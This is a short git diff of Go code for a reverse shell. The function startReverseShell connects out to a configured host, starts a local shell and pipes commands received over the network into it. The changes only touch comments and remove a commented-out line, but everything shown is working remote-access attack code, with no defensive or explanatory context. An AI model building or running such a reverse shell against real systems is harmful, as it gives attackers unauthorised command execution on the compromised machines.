@@ -24,13 +24,12 @@ func startReverseShell(config Config) {
 	conn, err := net.Dial(config.Protocol, host)
 	check(err)
 
-	//shellpath := path.Join(config.Path, "ash")
-
 	stdin := startShell(config.Path, conn)
 	reader := newNetLineReader(conn, config.Timeout)
 
-	// feed input from network until timeout value exceeds or
-	// EOF is met.
+	// Feed input from network until timeout value exceeds or EOF is met.
+	// Either way the process will panic and terminate, causing the shell
+	// to exit.
 	for {
 		line, err := reader.Readline()
 		check(err)
@@ -40,6 +39,8 @@ func startReverseShell(config Config) {
 	}
 }
 
+// startShell starts a shell, and returns a pipe to the stdin
+// of that shell
 func startShell(shellpath string, conn net.Conn) io.WriteCloser {
 	shellpath = loadShell(shellpath)
 
